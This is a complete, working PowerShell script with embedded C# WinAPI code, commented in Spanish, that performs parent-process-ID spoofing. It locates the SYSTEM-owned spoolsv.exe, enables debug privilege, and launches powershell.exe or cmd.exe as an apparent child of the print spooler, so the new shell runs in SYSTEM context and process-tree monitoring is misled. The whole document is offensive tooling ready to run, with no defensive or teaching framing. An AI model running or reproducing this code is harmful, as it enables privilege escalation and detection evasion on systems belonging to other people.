
#  Verifica que el proceso actual cuenta con SeDebugPrivilege habilitado.
#      Sin este privilegio no es posible obtener un handle sobre procesos
#      ajenos (como spoolsv.exe que corre como SYSTEM).
# Bloque de codigo C# embebido: implementa el spoofing de PPID via WinAPI
# Se compila en tiempo de ejecucion usando Add-Type

$CSharpCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ParentSpoofHelper
{
    // -------------------------------------------------------------------------
    // Importaciones de la API de Windows necesarias para el spoofing de PPID
    // -------------------------------------------------------------------------

    /// <summary>
    /// Crea un nuevo proceso. Utilizaremos la version extendida con STARTUPINFOEX
    /// para poder especificar el proceso padre mediante el atributo de hilo.
    /// </summary>
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcess(
        string lpApplicationName,       // Ruta completa al ejecutable
        string lpCommandLine,           // Linea de comandos (puede incluir el ejecutable)
        ref SECURITY_ATTRIBUTES lpProcessAttributes,  // Atributos de seguridad del proceso
        ref SECURITY_ATTRIBUTES lpThreadAttributes,   // Atributos de seguridad del hilo
        bool bInheritHandles,           // Heredar handles del padre
        uint dwCreationFlags,           // Flags de creacion (usamos EXTENDED_STARTUPINFO_PRESENT)
        IntPtr lpEnvironment,           // Bloque de entorno (null = heredar del padre)
        string lpCurrentDirectory,      // Directorio de trabajo (null = mismo que padre)
        [In] ref STARTUPINFOEX lpStartupInfo,         // Informacion de inicio extendida
        out PROCESS_INFORMATION lpProcessInformation  // Informacion del proceso creado
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList,     // Lista de atributos ya inicializada
        uint dwFlags,               // Reservado, debe ser 0
        IntPtr Attribute,           // Tipo de atributo a actualizar
        IntPtr lpValue,             // Puntero al valor del atributo
        IntPtr cbSize,              // Tamano del valor en bytes
        IntPtr lpPreviousValue,     // Puntero al valor anterior (no usado aqui)
        IntPtr lpReturnSize         // Puntero al tamano retornado (no usado aqui)
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList,     // NULL en la primera llamada para obtener tamano
        int dwAttributeCount,       // Numero de atributos que se van a almacenar
        int dwFlags,                // Reservado, debe ser 0
        ref IntPtr lpSize           // In/Out: tamano del buffer requerido
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);


    [DllImport("kernel32.dll")]
    static extern uint GetLastError();

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;   // Estructura base embebida
        public IntPtr lpAttributeList;    // Puntero a la lista de atributos extendidos
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32  cb;               // Tamano de la estructura (obligatorio inicializar)
        public string lpReserved;
        public string lpDesktop;        // Nombre del desktop (ej: "winsta0\\default")
        public string lpTitle;
        public Int32  dwX;
        public Int32  dwY;
        public Int32  dwXSize;
        public Int32  dwYSize;
        public Int32  dwXCountChars;
        public Int32  dwYCountChars;
        public Int32  dwFillAttribute;
        public Int32  dwFlags;
        public Int16  wShowWindow;
        public Int16  cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }


    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;   // Handle al proceso creado
        public IntPtr hThread;    // Handle al hilo principal del proceso creado
        public int    dwProcessId;
        public int    dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int    nLength;
        public IntPtr lpSecurityDescriptor;
        public int    bInheritHandle;
    }

    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;

    private const uint CREATE_NEW_CONSOLE = 0x00000010;

    private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    
    public static bool SpawnWithSpoofedParent(int ppid, string executablePath)
    {
        var pi = new PROCESS_INFORMATION();
        var si = new STARTUPINFOEX();

        si.StartupInfo.cb = Marshal.SizeOf(si);

        IntPtr lpValue = IntPtr.Zero;


        try
        {
            Process.EnterDebugMode();
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Error al habilitar modo debug: " + ex.Message);
            return false;
        }

        try
        {
           
            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);

          
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);

           
            if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize))
            {
                Console.WriteLine("[-] InitializeProcThreadAttributeList fallo. Error: " + GetLastError());
                return false;
            }

        
            IntPtr parentHandle;
            try
            {
                parentHandle = Process.GetProcessById(ppid).Handle;
                Console.WriteLine("[+] Handle obtenido para PID {0} (spoolsv.exe)", ppid);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] No se pudo obtener handle del proceso padre: " + ex.Message);
                return false;
            }

           
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, parentHandle);

            bool updated = UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,                                          // dwFlags reservado
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero
            );

            if (!updated)
            {
                Console.WriteLine("[-] UpdateProcThreadAttribute fallo. Error: " + GetLastError());
                return false;
            }

            Console.WriteLine("[+] Atributo PARENT_PROCESS actualizado correctamente");

            var pattr = new SECURITY_ATTRIBUTES();
            var tattr = new SECURITY_ATTRIBUTES();
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);

            Console.WriteLine("[+] Lanzando: " + executablePath);

           
            bool result = CreateProcess(
                executablePath,                                     // lpApplicationName
                executablePath,                                     // lpCommandLine
                ref pattr,                                          // atributos del proceso
                ref tattr,                                          // atributos del hilo
                false,                                              // no heredar handles
                EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, // flags
                IntPtr.Zero,                                        // entorno heredado
                null,                                               // directorio de trabajo
                ref si,                                             // startup info extendida
                out pi                                              // info del proceso creado
            );

            if (result)
            {
                Console.WriteLine("[+] Proceso lanzado exitosamente.");
                Console.WriteLine("    PID del proceso hijo : " + pi.dwProcessId);
                Console.WriteLine("    TID del hilo principal: " + pi.dwThreadId);
            }
            else
            {
                Console.WriteLine("[-] CreateProcess fallo. Ultimo error Win32: " + GetLastError());
            }

            return result;
        }
        finally
        {
            if (si.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }

            // Liberar el buffer que contenia el handle del padre
            if (lpValue != IntPtr.Zero)
            {
                Marshal.FreeHGlobal(lpValue);
            }

            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread  != IntPtr.Zero) CloseHandle(pi.hThread);
        }
    }
}
"@



function Test-SeDebugPrivilege {

    Write-Host "`n[*] Verificando SeDebugPrivilege en el token actual..." -ForegroundColor Cyan

    try {

        $privilegeOutput = whoami /priv 2>&1 | Where-Object {
            $_ -match "SeDebugPrivilege"
        }

        if (-not $privilegeOutput) {
            Write-Host "[-] SeDebugPrivilege no esta presente en el token actual." -ForegroundColor Red
            Write-Host "    Es necesario ejecutar este script como Administrador." -ForegroundColor Yellow
            return $false
        }

        if ($privilegeOutput -match "Enabled") {
            Write-Host "[+] SeDebugPrivilege: HABILITADO" -ForegroundColor Green
            return $true
        }
        else {
            Write-Host "[-] SeDebugPrivilege esta presente pero en estado DISABLED." -ForegroundColor Red
            Write-Host "    La sesion elevada podria no tener el privilegio activo." -ForegroundColor Yellow
            return $false
        }
    }
    catch {
        Write-Host "[-] Error al verificar privilegios: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}


function Get-SpoolsvSystemPid {

    Write-Host "`n[*] Buscando proceso spoolsv.exe con propietario NT AUTHORITY\SYSTEM..." -ForegroundColor Cyan

    try {
       
        $spoolProcesses = Get-WmiObject Win32_Process -Filter "Name = 'spoolsv.exe'" -ErrorAction Stop

        if (-not $spoolProcesses) {
            Write-Host "[-] No se encontro ningun proceso con nombre spoolsv.exe." -ForegroundColor Red
            Write-Host "    El servicio Print Spooler podria estar detenido." -ForegroundColor Yellow
            return $null
        }

        foreach ($proc in $spoolProcesses) {

            $ownerInfo = $proc.GetOwner()

            $ownerUser   = $ownerInfo.User
            $ownerDomain = $ownerInfo.Domain

            Write-Host "[*] spoolsv.exe encontrado - PID: $($proc.ProcessId) - Propietario: $ownerDomain\$ownerUser" -ForegroundColor DarkCyan

          
            if ($ownerDomain -ieq "NT AUTHORITY" -and $ownerUser -ieq "SYSTEM") {
                Write-Host "[+] Propietario confirmado: NT AUTHORITY\SYSTEM" -ForegroundColor Green
                Write-Host "[+] PID de spoolsv.exe: $($proc.ProcessId)" -ForegroundColor Green
                return [int]$proc.ProcessId
            }
            else {
                Write-Host "[-] El propietario no es NT AUTHORITY\SYSTEM, se descarta." -ForegroundColor Yellow
            }
        }

        Write-Host "[-] Ningun proceso spoolsv.exe pertenece a NT AUTHORITY\SYSTEM." -ForegroundColor Red
        return $null
    }
    catch {
        Write-Host "[-] Error al consultar WMI para spoolsv.exe: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}


function Resolve-ShellExecutable {

    Write-Host "`n[*] Determinando interprete de comandos a utilizar..." -ForegroundColor Cyan
    $powershellPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $cmdPath        = "$env:SystemRoot\System32\cmd.exe"

    if (Test-Path $powershellPath) {
        Write-Host "[+] powershell.exe encontrado: $powershellPath" -ForegroundColor Green
        return $powershellPath
    }
    else {
        Write-Host "[!] powershell.exe no encontrado. Usando cmd.exe como fallback." -ForegroundColor Yellow
        Write-Host "[+] cmd.exe: $cmdPath" -ForegroundColor Green
        return $cmdPath
    }
}

function Invoke-ParentSpoof {

    Write-Host "============================================================" -ForegroundColor Magenta
    Write-Host "  Invoke-ParentSpoof - PPID Spoofing via spoolsv.exe/SYSTEM " -ForegroundColor Magenta
    Write-Host "============================================================" -ForegroundColor Magenta

    $hasDebugPriv = Test-SeDebugPrivilege
    if (-not $hasDebugPriv) {
        Write-Host "`n[!] Abortando: SeDebugPrivilege no disponible o no habilitado." -ForegroundColor Red
        Write-Host "    Ejecuta PowerShell como Administrador e intentalo de nuevo." -ForegroundColor Yellow
        return
    }

    $spoolPid = Get-SpoolsvSystemPid
    if ($null -eq $spoolPid) {
        Write-Host "`n[!] Abortando: No se pudo confirmar spoolsv.exe como NT AUTHORITY\SYSTEM." -ForegroundColor Red
        return
    }

    $executablePath = Resolve-ShellExecutable

    Write-Host "`n[*] Preparando ensamblado C# para WinAPI..." -ForegroundColor Cyan

    if (-not ([System.Management.Automation.PSTypeName]'ParentSpoofHelper').Type) {
        try {
            Add-Type -TypeDefinition $CSharpCode -Language CSharp -ErrorAction Stop
            Write-Host "[+] Tipo ParentSpoofHelper compilado y cargado correctamente." -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Error al compilar el codigo C#: $($_.Exception.Message)" -ForegroundColor Red
            return
        }
    }
    else {
        Write-Host "[+] Tipo ParentSpoofHelper ya estaba cargado en la sesion." -ForegroundColor DarkGreen
    }

  
    Write-Host "`n[*] Iniciando PPID Spoofing..." -ForegroundColor Cyan
    Write-Host "    PID padre objetivo (spoolsv.exe) : $spoolPid" -ForegroundColor DarkCyan
    Write-Host "    Ejecutable a lanzar              : $executablePath" -ForegroundColor DarkCyan

    $success = [ParentSpoofHelper]::SpawnWithSpoofedParent($spoolPid, $executablePath)

  
    Write-Host "`n============================================================" -ForegroundColor Magenta
    if ($success) {
        Write-Host "  [+] PPID Spoofing completado exitosamente." -ForegroundColor Green
        Write-Host "  El proceso hijo deberia aparecer como hijo de spoolsv.exe" -ForegroundColor Green
        Write-Host "  en herramientas como Process Explorer, Process Hacker, etc." -ForegroundColor Green
    }
    else {
        Write-Host "  [-] El PPID Spoofing fallo. Revisa los mensajes anteriores." -ForegroundColor Red
    }
    Write-Host "============================================================" -ForegroundColor Magenta
}


if ($MyInvocation.InvocationName -ne '.') {
    Invoke-ParentSpoof
}

#codigo echo por un amigo de colombia (Edwin)
